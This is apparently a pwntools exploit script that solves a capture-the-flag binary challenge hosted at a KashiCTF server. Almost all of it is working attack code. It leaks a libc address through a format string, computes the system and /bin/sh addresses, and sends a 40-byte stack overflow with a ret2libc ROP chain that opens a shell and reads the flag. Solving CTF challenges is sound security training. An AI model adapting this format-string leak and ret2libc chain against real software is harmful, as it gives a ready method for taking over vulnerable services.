#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

TARGET = './vuln'
HOST = 'kashictf.iitbhucybersec.in'
PORT = 55698

elf = ELF(TARGET)
libc = ELF('./libc.so.6')
ld = ELF("./ld-linux-x86-64.so.2")

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

#context.log_level = 'DEBUG'

gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ===================================== #


# STAGE 1 : Leak address from stack using 'printf format string'

fmtstr = b'%17$p'   # leaked libc address is at 17th offset

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
libc_start_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh\x00"))

print("Offsets:")
print(f"__libc_start_main : {hex(libc_start_offset)}")
print(f"system            : {hex(system_offset)}")
print(f"/bin/sh           : {hex(binsh_offset)}")
print("==================================")

payload = flat(
    fmtstr,
)
p.sendline(payload)


# STAGE 2 : Clean up the leaked address

p.recvuntil(b'not giving you ')

# Leaking address and find libc base address
leak = p.recvuntil(b'\n').strip().decode()
libc_start_main = int(leak, 16) + 0x36  # this is adjacent (not very adjacent, but close) to the function '__libc_start_main', their difference is 0x36 bytes
libc_base = libc_start_main - libc_start_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

print(f"leaked address    : {leak}")
print(f"__libc_start_main : {hex(libc_start_main)}")
print(f"libc_base         : {hex(libc_base)}")
print(f"system            : {hex(system)}")
print(f"binsh             : {hex(binsh)}")


# STAGE 3 : Craft payload from leaked addresses and send it to remote server

# Find pop rdi; ret; in libc
rop_libc = ROP(libc)
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
pop_rdi_addr = libc_base + pop_rdi

# Overflow, set up rdi register with '/bin/sh' string, call system()
pop_shell = flat(
    'A' * 40,
    ret,
    pop_rdi_addr,
    binsh,
    system
)
p.sendline(pop_shell)

p.sendline(b'cat flag*')

p.interactive()
p.close()

# NOTE:
# Format string leak & Ret2libc
